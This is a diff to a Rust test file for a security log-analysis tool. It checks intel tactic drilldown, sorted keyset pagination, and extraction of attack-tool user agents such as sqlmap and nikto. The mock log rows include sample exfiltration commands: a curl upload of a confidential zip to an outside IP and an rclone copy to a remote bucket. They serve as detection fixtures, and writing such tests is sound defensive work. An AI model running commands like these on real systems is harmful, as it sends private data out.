@@ -7,8 +7,10 @@ use log_parser_lib::header_utils;
 use log_parser_lib::intel::chains::compute_chains;
 use log_parser_lib::intel::matcher::scan_connection_with_options;
 use log_parser_lib::intel::roles::detect_column_roles;
+use log_parser_lib::intel::ioc::extract_iocs;
 use log_parser_lib::query::{
-    count_rows, query_rows, ColumnFilter, FilterOp, QueryExpression, QuerySpec,
+    count_rows, query_rows, ColumnFilter, FilterOp, QueryExpression, QuerySpec, SortDirection,
+    SortSpec,
 };
 use std::collections::HashSet;
 use std::path::PathBuf;
@@ -394,4 +396,211 @@ fn test_edge_cases_wide_files_missing_headers_special_characters_pagination() {
         let count_res = count_rows(&conn, &cols, &test_spec);
         assert!(count_res.is_ok(), "count_rows failed on raw query: {q} -> {:?}", count_res.err());
     }
+}
+
+#[test]
+fn test_analyst_evaluation_sorting_intel_drilldown_and_tool_ua_detection() {
+    let db_path = temp_db_path("eval-drilldown-sort-ua");
+    let conn = db::open(&db_path).unwrap();
+
+    let raw_headers = vec![
+        "Timestamp".to_string(),
+        "Account".to_string(),
+        "Host".to_string(),
+        "UserAgent".to_string(),
+        "ProcessName".to_string(),
+        "CommandLine".to_string(),
+    ];
+    let cols = header_utils::sanitize_headers(&raw_headers);
+    db::create_schema(&conn, &cols).unwrap();
+
+    // Ingest 250 rows with RFC-compliant mock records, tools, and threat behaviors
+    for i in 1..=250 {
+        let account = match i % 4 {
+            0 => "admin",
+            1 => "alice",
+            2 => "bob",
+            _ => "charlie",
+        };
+        let host = format!("HOST-{:03}", i % 20);
+        let ua = match i {
+            42 => "curl/8.1.2",
+            88 => "rclone/v1.62.0",
+            10 => "sqlmap/1.7#dev",
+            15 => "nikto/2.1.6",
+            20 => "dirbuster/1.0",
+            25 => "client rest;;axios",
+            30 => "PostmanRuntime/7.32.3",
+            35 => "kubectl/v1.27.0",
+            40 => "gobuster | nmap",
+            45 => "python-requests/2.31.0\r\nGo-http-client/1.1",
+            _ => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        };
+        let proc = match i {
+            42 => "curl.exe",
+            88 => "rclone.exe",
+            _ => "svchost.exe",
+        };
+        let cmd = match i {
+            42 => "curl -T C:\\confidential.zip https://198.51.100.200/upload",
+            88 => "rclone copy C:\\data remote:bucket",
+            _ => "svchost.exe -k netsvcs",
+        };
+
+        conn.execute(
+            "INSERT INTO rows (row_num, timestamp, account, host, useragent, processname, commandline)
+             VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7)",
+            rusqlite::params![
+                i as i64,
+                format!("2026-03-10T12:{:02}:{:02}Z", (i / 60) % 60, i % 60),
+                account,
+                host,
+                ua,
+                proc,
+                cmd,
+            ],
+        ).unwrap();
+    }
+    db::populate_fts(&conn, &cols).unwrap();
+
+    // 1. Threat Enrichment Drilldown Verification:
+    // Create intel schema and insert detections including 2 rows of Exfiltration: row 42 and row 88
+    db::create_intel_schema(&conn).unwrap();
+    conn.execute_batch(
+        "INSERT INTO _intel_match (row_num, tactic_id, tactic_name, technique_id, technique_name, pattern_id, keyword, column_name, score)
+         VALUES
+            (42, 'TA0010', 'Exfiltration', 'T1048', 'Exfiltration Over Alternative Protocol', 'p-curl', 'curl', 'useragent', 90),
+            (88, 'TA0010', 'Exfiltration', 'T1567', 'Exfiltration to Cloud Storage', 'p-rclone', 'rclone', 'useragent', 95),
+            (10, 'TA0001', 'Initial Access', 'T1190', 'Exploit Public-Facing Application', 'p-sqlmap', 'sqlmap', 'useragent', 85),
+            (20, 'TA0009', 'Collection', 'T1005', 'Data from Local System', 'p-dir', 'dirbuster', 'useragent', 70);
+        "
+    ).unwrap();
+
+    // Query 2 rows of Exfiltration
+    let exfil_spec = QuerySpec {
+        expression: Some(QueryExpression::IntelTactic {
+            name: "Exfiltration".to_string(),
+        }),
+        ..QuerySpec::default()
+    };
+    let exfil_count = count_rows(&conn, &cols, &exfil_spec).unwrap();
+    assert_eq!(exfil_count, 2, "Exfiltration tactic must count exactly 2 rows");
+
+    let exfil_page = query_rows(&conn, &cols, &exfil_spec).unwrap();
+    let exfil_row_nums: Vec<i64> = exfil_page.rows.iter().map(|r| r["row_num"].as_i64().unwrap()).collect();
+    assert_eq!(exfil_row_nums, vec![42, 88], "Exfiltration drilldown must return rows 42 and 88");
+
+    // Case-insensitive test ("exfiltration")
+    let exfil_lower_spec = QuerySpec {
+        expression: Some(QueryExpression::IntelTactic {
+            name: "exfiltration".to_string(),
+        }),
+        ..QuerySpec::default()
+    };
+    assert_eq!(count_rows(&conn, &cols, &exfil_lower_spec).unwrap(), 2);
+
+    // Combine Intel Drilldown with Sorting by row_num DESC:
+    let exfil_sort_desc = QuerySpec {
+        expression: Some(QueryExpression::IntelTactic {
+            name: "Exfiltration".to_string(),
+        }),
+        sort: Some(SortSpec {
+            column: "row_num".into(),
+            direction: SortDirection::Desc,
+        }),
+        ..QuerySpec::default()
+    };
+    let exfil_desc_page = query_rows(&conn, &cols, &exfil_sort_desc).unwrap();
+    let desc_row_nums: Vec<i64> = exfil_desc_page.rows.iter().map(|r| r["row_num"].as_i64().unwrap()).collect();
+    assert_eq!(desc_row_nums, vec![88, 42], "Filtered rows must be sorted DESC by row_num");
+
+    // 2. Evidence Grid Sorting Verification:
+    // Sort by row_num ASC with keyset pagination
+    let sort_asc = QuerySpec {
+        sort: Some(SortSpec {
+            column: "row_num".into(),
+            direction: SortDirection::Asc,
+        }),
+        limit: 100,
+        ..QuerySpec::default()
+    };
+    let page1_asc = query_rows(&conn, &cols, &sort_asc).unwrap();
+    assert_eq!(page1_asc.rows.len(), 100);
+    assert_eq!(page1_asc.rows[0]["row_num"], serde_json::json!(1));
+    assert_eq!(page1_asc.rows[99]["row_num"], serde_json::json!(100));
+    assert!(page1_asc.has_more);
+
+    let mut sort_asc_p2 = sort_asc.clone();
+    sort_asc_p2.cursor = page1_asc.next_cursor;
+    let page2_asc = query_rows(&conn, &cols, &sort_asc_p2).unwrap();
+    assert_eq!(page2_asc.rows.len(), 100);
+    assert_eq!(page2_asc.rows[0]["row_num"], serde_json::json!(101));
+    assert_eq!(page2_asc.rows[99]["row_num"], serde_json::json!(200));
+
+    let mut sort_asc_p3 = sort_asc.clone();
+    sort_asc_p3.cursor = page2_asc.next_cursor;
+    let page3_asc = query_rows(&conn, &cols, &sort_asc_p3).unwrap();
+    assert_eq!(page3_asc.rows.len(), 50);
+    assert_eq!(page3_asc.rows[0]["row_num"], serde_json::json!(201));
+    assert_eq!(page3_asc.rows[49]["row_num"], serde_json::json!(250));
+    assert!(!page3_asc.has_more);
+
+    // Sort by row_num DESC with keyset pagination
+    let sort_desc = QuerySpec {
+        sort: Some(SortSpec {
+            column: "row_num".into(),
+            direction: SortDirection::Desc,
+        }),
+        limit: 100,
+        ..QuerySpec::default()
+    };
+    let page1_desc = query_rows(&conn, &cols, &sort_desc).unwrap();
+    assert_eq!(page1_desc.rows.len(), 100);
+    assert_eq!(page1_desc.rows[0]["row_num"], serde_json::json!(250));
+    assert_eq!(page1_desc.rows[99]["row_num"], serde_json::json!(151));
+    assert!(page1_desc.has_more);
+
+    let mut sort_desc_p2 = sort_desc.clone();
+    sort_desc_p2.cursor = page1_desc.next_cursor;
+    let page2_desc = query_rows(&conn, &cols, &sort_desc_p2).unwrap();
+    assert_eq!(page2_desc.rows.len(), 100);
+    assert_eq!(page2_desc.rows[0]["row_num"], serde_json::json!(150));
+    assert_eq!(page2_desc.rows[99]["row_num"], serde_json::json!(51));
+
+    let mut sort_desc_p3 = sort_desc.clone();
+    sort_desc_p3.cursor = page2_desc.next_cursor;
+    let page3_desc = query_rows(&conn, &cols, &sort_desc_p3).unwrap();
+    assert_eq!(page3_desc.rows.len(), 50);
+    assert_eq!(page3_desc.rows[0]["row_num"], serde_json::json!(50));
+    assert_eq!(page3_desc.rows[49]["row_num"], serde_json::json!(1));
+    assert!(!page3_desc.has_more);
+
+    // 3. User-Agent Tool Detection & IOC Extraction Verification:
+    let suggestions = detect_column_roles(&conn, &cols).unwrap();
+    let ua_suggestion = suggestions.iter().find(|s| s.role == "user_agent");
+    assert!(ua_suggestion.is_some(), "user_agent column role must be detected");
+    assert_eq!(ua_suggestion.unwrap().sql_name, "useragent");
+
+    let ioc_bundle = extract_iocs(&conn, &cols, |_, _, _| {}).unwrap();
+    let extracted_uas: HashSet<String> = ioc_bundle
+        .user_agent_indicators
+        .iter()
+        .map(|u| u.user_agent.clone())
+        .collect();
+    
+    assert!(extracted_uas.contains("sqlmap/1.7#dev"), "sqlmap must be extracted");
+    assert!(extracted_uas.contains("nikto/2.1.6"), "nikto must be extracted");
+    assert!(extracted_uas.contains("dirbuster/1.0"), "dirbuster must be extracted");
+    assert!(extracted_uas.contains("curl/8.1.2"), "curl must be extracted");
+    assert!(extracted_uas.contains("rclone/v1.62.0"), "rclone must be extracted");
+    assert!(extracted_uas.contains("kubectl/v1.27.0"), "kubectl must be extracted");
+    assert!(extracted_uas.contains("PostmanRuntime/7.32.3"), "Postman must be extracted");
+    assert!(extracted_uas.contains("client rest"), "compound ;; delimiter left part");
+    assert!(extracted_uas.contains("axios"), "compound ;; delimiter right part");
+    assert!(extracted_uas.contains("gobuster"), "pipe delimiter left part");
+    assert!(extracted_uas.contains("nmap"), "pipe delimiter right part");
+    assert!(extracted_uas.contains("python-requests/2.31.0"), "newline delimiter first part");
+    assert!(extracted_uas.contains("Go-http-client/1.1"), "newline delimiter second part");
+
+    let _ = std::fs::remove_file(&db_path);
 }
